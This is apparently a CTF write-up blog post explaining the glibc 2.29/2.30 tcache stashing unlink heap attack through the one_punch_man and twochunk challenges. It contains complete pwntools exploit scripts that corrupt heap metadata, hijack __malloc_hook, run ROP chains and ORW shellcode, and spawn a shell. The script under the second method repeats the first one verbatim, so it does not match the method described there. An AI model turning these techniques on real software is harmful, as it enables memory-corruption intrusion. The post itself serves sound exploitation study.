---
title: Tcache stashing unlink atk
date: 2020-03-12 21:53:19
tags: glibc-2.29
---
Tcache-stashing-unlink-atk
<!--more-->
# prelogue
[one_punch_man][1](glibc-2.29)
[twochunk][0](glibc-2.30)
There are two challenges: one_punch_man(glibc-2.29) & twochunk(libc-2.30)
This passage would introduce a method which is call "tcache stashing unlink attack" 
mainly used when 
1. can't tacache-attack (ex: `calloc` + in some conditions you can malloc...)
2. can't fastbin-attack (size is limited)


# what's new in glibc-2.29
before the main part, it's important to know what's new in glibc-2.29.
## setcontext
setcontext would not be as useful as before, becouse it will set `rbx` as a base-ptr rather than `rdi`.
```arm
//setcontext
push rdi
...
...
pop rbx
mov rsp, qword ptr [rbx+0xa0]
...
```
## tcache double free 
Tcache is much friedly than fastbin. We can `free(p);free(p)` in glibc-2.27 but not in 2.29 for 
```arm
//_int_free()
if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }
```
How wonderful time flies....but don't worry, we still have fastbin-atk.(haha
However, today we just can't malloc <= global_fast_max ... 
## unsorted bin atk
```amd64
if (__glibc_unlikely (bck->fd != victim)
              || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
            malloc_printerr ("malloc(): unsorted double linked list corrupted");
```
unsorted bin is not accessible either...
## Another Trick about small bin (not new in 2.29 similar code appeared earlier)
If you get a chunk from small bin, the remained chunk will be stashed in the tcache.
```arm
/* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb);
	  if (tcache && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
	            }
		}
```
there is an example to help understanding the code showed:
1. small bin[0x90] : 0x55555555a000 --> 0x55555555b000 && tcache[0x90](0) : 0  
2. calloc(0x88)
3. small-bin First in first out, so we will get chunk at 0x55555555b000
4. smallbin[0x90].tc_idx == 0x0 is less than 0x7 so chunk at  0x55555555a000 will be stashed into tache[0x90]
5. small bin[0x90] : none && tcache[0x90](1) : 0x55555555a000

we can use the unlink-option in this procedure.

# one_punch_man
an amazing punch of hitcon 2019.
## Analysis
UAF in delect function.
```amd64
void __fastcall del(__int64 a1, __int64 a2)
{
  unsigned int idx; // [rsp+Ch] [rbp-4h]

  do_put("idx: ");
  idx = get_int();
  if ( idx > 2 )
    error("invalid");
  free((void *)list[idx].ptr);
}
```
but we have the only malloc in the backdoor function and calloc in add func.
```amd64
ssize_t __fastcall magic(__int64 a1, __int64 a2)
{
  void *buf; // [rsp+8h] [rbp-8h]

  if ( *(_BYTE *)(HAEP + 32) <= 6 )
    error("gg");
  buf = malloc(0x217uLL);
  if ( !buf )
    error("err");
  if ( read(0, buf, 0x217uLL) <= 0 )
    error("io");
  puts("Serious Punch!!!");
  puts((const char *)&unk_2128);
  return puts((const char *)buf);
}
``` 
In normal condition, `HAEP + 32 <= 6` means we can get the first chunk of tcache[0x220] or smallbin[0x220].

```amd64
unsigned __int64 __fastcall add(__int64 a1, __int64 a2)
{
  unsigned int idx; // [rsp+8h] [rbp-418h]
  signed int v4; // [rsp+Ch] [rbp-414h]
  char s[1032]; // [rsp+10h] [rbp-410h]
  unsigned __int64 v6; // [rsp+418h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  do_put("idx: ");
  idx = get_int();
  if ( idx > 2 )
    error("invalid");
  do_put("hero name: ");
  memset(s, 0, 0x400uLL);
  v4 = read(0, s, 0x400uLL);
  if ( v4 <= 0 )
    error("io");
  s[v4 - 1] = 0;
  if ( v4 <= 127 || v4 > 1024 )
    error("poor hero name");
  list[idx].ptr = (__int64)calloc(1uLL, v4);
  size_list[2 * idx] = v4;
  strncpy((char *)list[idx].ptr, s, v4);
  memset(s, 0, 0x400uLL);
  return __readfsqword(0x28u) ^ v6;
}
```
the size of calloc is limited between [0x80,0x400] ,so in this condition(glibc 2.29+calloc+size-limit)double-free is not accessible. 

## solution
0. leak heap & libc
1. small bin unlink to set HEAP+0x30 >=8 
2. magic() + magic() get __malloc_hook 
3. orw get flag.

#### small bin unlink
set unlink in the procedure of getting smallbin is checked. 
```amd64
 if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;
```
but unlink in the procedure of moving rest smallbin to the tcache is not checked.
```amd64
if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
	            }
```
1. set smallbin[0x90]: A --> B
2. set tcache[0x90](6) 
3. set tcache[0x220](2): chunk -> __malloc_hook
4. modify fd,bk of B : fd=A bk=HEAP+0x30-0x10
5. calloc 0x88
6. magic()
7. magic() to modify __malloc_hook


## exp
```python
from pwn import *
context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch='amd64'
def cmd(c):
    p.sendlineafter("> ",str(c))
def add(idx,size,c="A"):
    cmd(1)
    p.sendlineafter(": ",str(idx))
    p.sendafter(": ",c.ljust(size,'\0'))
def edit(idx,c):
    cmd(2)
    p.sendlineafter(": ",str(idx))
    p.sendafter(": ",c)
def show(idx):
    cmd(3)
    p.sendlineafter(": ",str(idx))
def free(idx):
    cmd(4)
    p.sendlineafter(": ",str(idx))

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process("./pwn")
#p=remote("buuoj.cn",25327)
for x in range(6):
    add(0,0x88)
    free(0)
for x in range(7):
    add(0,0x288,"n132")
    free(0)
add(0,0x288)
add(1,0x99)
free(0)
show(0)
p.readuntil("name: ")
base=u64(p.read(6)+'\0\0')-libc.sym['__malloc_hook']-0x70
libc.address=base

add(0,0x1f8)
free(0)
free(1)
add(0,0x288)
add(1,0x99)
free(0)
add(2,0x1f8)
free(2)
show(2)
p.readuntil("name: ")
heap=u64(p.read(6)+'\0\0')-0x17b0
add(2,0x217)
free(2)
edit(2,p64(libc.sym['__malloc_hook']))
edit(0,'\0'*0x1f8+p64(0x91)+p64(heap+0x19a0)+p64(heap+0x30-0x10))
log.warning(hex(heap))
log.warning(hex(base))
add(1,0x88)
cmd(0xc388)
sh=shellcraft.open("./flag")
sh+='''
mov rdi,rax
mov rsi,{}
mov rdx,0x30
xor rax,rax
syscall
mov rdi,1
mov rax,1
syscall
'''.format(heap+0x800)
p.send(asm(sh))
cmd(0xc388)
gadget=0x000000000010e994+base#add rsp,0x58;ret;
rdi=0x0000000000026542+base
gdb.attach(p)
p.send(p64(gadget))
ret=0x000000000002535f+base
rdi=0x0000000000026542+base
rsi=0x0000000000026f9e+base
rdx=0x000000000012bda6+base
rax=0x0000000000047cf8+base
sys=0x0000000000026bd4+base
rcx=0x000000000010b31e+base
rop=p64(ret)*3+p64(rdi)+p64(0xa)+p64(rsi)+p64(heap)+p64(rdx)+p64(0x3000)+p64(rcx)+p64(7)+p64(libc.sym['syscall'])+p64(heap+0x1e30)
add(0,0x200,rop)
p.interactive()
```

# twochunk
an exquisite expanding of one_punch_man 
英文不好写篇文章累个半死...换中文..还是中文情切.
这题比赛时候我们队用的是另一种方法类似的方法做出来...跑了好几个小时....碰撞地址...其实这题有其特殊性.首先咱来分析一下这题.
## Analysis
这题主要有7个功能大多数功能都是有使用次数限制的(做的时候太难受了!)
全题最多允许存在的index只能为0或者1...
Add function:
可以选择
1. malloc(0xf8)但是size为23333 只有一次机会+`strchr(list[idx].ptr, 0x7F))`结果要为0
2. calloc(size) size>0x80 && size<=0x3ff


Show function:
`write(1,buf,8)` 只能用一次.
edit function:
溢出

free 就挺正常的...
还有一个`malloc(0x80)`只能用一次的功能,一个显示message的功能和一个call message的后门.
上面那题过程讲的挺清楚这里就直接来思路吧.主要的漏洞就是heap溢出漏洞,主要限制是idx限制2个,`calloc`限制大小很多功能只能用一次.

# solution
可以直接看第二种.


## 1
这个是我没有理解`tcache stashing unlink atk`真谛想的辣鸡做法..概率大概是4096 * n倍,我从晚上12点左右开始跑用tmux 同步开了11个终端,早上6半我起来收到了一个flag...
0. leak heap
1. tcache stashing unlink atk 写 bss 上的 edit_time,由heap地址推断 
2. edit次数不限了就非常简单了
这里贴一下[@ch4r1l3][3]的exp,大哥tql!
```python
from pwn import *
#context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch='amd64'
def cmd(c):
	p.sendafter(": ",str(c))
def add(idx,size):
	cmd(1)
	cmd(idx)
	cmd(size)
def free(idx):
	cmd(2)
	cmd(idx)
def show(idx):
	cmd(3)
	cmd(idx)
def edit(idx,c):
	cmd(4)
	cmd(idx)
	p.sendafter(": ",c)
def msg(c):
	cmd(6)
	p.sendafter(": ",c)
#p=remote("121.36.209.145",9999)
p=process('./twochunk')
libc=ELF("/lib/x86_64-linux-gnu/libc-2.30.so")
p.sendafter(": ",flat(0x23333000,0x23333020))
p.sendafter(": ","1"*0x40)
for x in range(7):
    add(0,0x188)
    free(0)
for x in range(5):
    add(0,0x88)
    free(0)
add(0,0x188)
add(1,0x99)
free(0)
add(0,0xf8)
free(0)
add(0,0x99)
free(1)
free(0)
add(0,0x188)
add(1,0x99)
free(0)
add(0,0xf8)
free(0)
add(0,0x99)
free(1)
free(0)
add(0,23333)
show(0)
heap=u64(p.read(8))
log.warning(hex(heap))
pay='\0'*0xf8+flat(0x91,heap+0xf0,0x23333000-0x10)
edit(0,pay)
add(1,0x88)
cmd(5)
p.readuntil("age:")
base=u64(p.read(6)+'\0\0')-(0xfff7fbfc6020-0x7ffff7dd5000)
log.warning(hex(base))
cmd(6)
libc.address=base
p.sendafter(": ",flat(libc.sym['system'],0,0,0,0,0,libc.search("/bin/sh").next()))
#gdb.attach(p,'''
#''')
cmd(7)
p.interactive()
```

## 2
赛后其他队伍的做法之一.Null tql!
这题有个比较特殊的地方是我们知道了一些地址:0x2333000.而且能在上面写一些东西.控制fd,bk就像我们刚学unlink的时候一样..我们可以控制unlink使之链入`tcache[0x80]`,利用malloc0x80获得然后就可以走后门了.
主要的过程:
0. modify fd,bk of 0x23333000 : fd=随便 bk=0x23333030-0x10
1. show to leak heap
2. set smallbin[0x90]: A --> B --> 0x23333000-0x10
3. set tcache[0x90](5) 
4. calloc 0x88
5. leak libc
6. malloc 0x80
7. system('/bin/sh')


```python
from pwn import *
#context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch='amd64'
def cmd(c):
	p.sendafter(": ",str(c))
def add(idx,size):
	cmd(1)
	cmd(idx)
	cmd(size)
def free(idx):
	cmd(2)
	cmd(idx)
def show(idx):
	cmd(3)
	cmd(idx)
def edit(idx,c):
	cmd(4)
	cmd(idx)
	p.sendafter(": ",c)
def msg(c):
	cmd(6)
	p.sendafter(": ",c)
#p=remote("121.36.209.145",9999)
p=process('./twochunk')
libc=ELF("/lib/x86_64-linux-gnu/libc-2.30.so")
p.sendafter(": ",flat(0x23333000,0x23333020))
p.sendafter(": ","1"*0x40)
for x in range(7):
    add(0,0x188)
    free(0)
for x in range(5):
    add(0,0x88)
    free(0)
add(0,0x188)
add(1,0x99)
free(0)
add(0,0xf8)
free(0)
add(0,0x99)
free(1)
free(0)
add(0,0x188)
add(1,0x99)
free(0)
add(0,0xf8)
free(0)
add(0,0x99)
free(1)
free(0)
add(0,23333)
show(0)
heap=u64(p.read(8))
log.warning(hex(heap))
pay='\0'*0xf8+flat(0x91,heap+0xf0,0x23333000-0x10)
edit(0,pay)
add(1,0x88)
cmd(5)
p.readuntil("age:")
base=u64(p.read(6)+'\0\0')-(0xfff7fbfc6020-0x7ffff7dd5000)
log.warning(hex(base))
cmd(6)
libc.address=base
p.sendafter(": ",flat(libc.sym['system'],0,0,0,0,0,libc.search("/bin/sh").next()))
#gdb.attach(p,'''
#''')
cmd(7)
p.interactive()
```
# summary
了解了很多新版glibc.感谢师傅们的题目!
`tcache stashing unlink atk`利用场景
1. calloc+限量 malloc
2. calloc 大小不能为fastbin
3. 可以unsortedbin atk 就unsortedbin atk 不可以就smallbin atk
4. 如果已知地址有edit机会就可以unlink去获得该区域.

# reference
[@122ama****][2]

[0]: https://github.com/n132/Watermalon/tree/master/Hitcon_2019/one_punch_man
[1]: https://github.com/n132/Watermalon/tree/master/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB_2020/twochunk
[2]: https://xz.aliyun.com/t/7192
[3]: ch4r1l3.github.io
